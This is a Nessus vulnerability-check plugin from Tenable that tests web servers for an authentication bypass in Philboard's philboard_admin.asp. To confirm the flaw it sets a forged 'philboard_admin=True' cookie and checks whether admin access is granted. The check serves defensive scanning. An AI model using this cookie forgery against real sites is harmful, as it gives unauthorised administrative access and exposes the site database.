# 
# (C) Tenable Network Security, Inc.
#
# 
#

include("compat.inc");

if(description)
{
 script_id(11675);
 script_bugtraq_id(7739);
 script_xref(name:"OSVDB", value:"4769");
 script_version ("$Revision: 1.12 $");
 
 script_name(english:"Philboard philboard_admin.ASP Authentication Bypass");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a
authentication bypass issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Philboard. There is a flaw when handling 
cookie-based authentication credentials which may allow an attacker
to gain unauthorized administrative access or to download the 
database of the remote server." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/323224" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();
 
 script_summary(english:"Try to bypass Philboard philboard_admin.ASP Authentication");
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003-2008 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The script code starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

dirs = list_uniq("/philboard", "/board", "/forum", cgi_dirs());

foreach dir (dirs)
{
  init_cookiejar();
  url = dir +"/philboard_admin.asp";
  r = http_send_recv3(method: "GET", item: url, port:port);
  if (isnull(r)) exit(1,"Null response to '" + url + "' request.");
 
  if( "password" >< r[2] )
  {
   set_http_cookie(name: "philboard_admin", value: "True");
   r = http_send_recv3(method: "GET", port: port, item: url);
   if('<option value="admin" selected>admin</option>' >< r[2])
   {
    security_hole(port);
   }
   exit(0);
  }
}
